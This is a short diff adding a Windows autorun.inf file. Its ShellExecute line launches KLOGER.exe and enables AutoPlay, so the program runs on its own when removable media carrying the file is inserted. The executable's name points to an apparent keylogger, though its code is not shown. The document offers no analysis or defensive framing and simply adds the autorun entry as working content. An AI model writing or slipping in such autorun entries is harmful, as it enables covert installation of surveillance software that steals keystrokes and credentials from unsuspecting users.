@@ -1,0 +1,4 @@
+[autorun]
+;Open=KLOGER.exe
+ShellExecute=KLOGER.exe
+UseAutoPlay=1
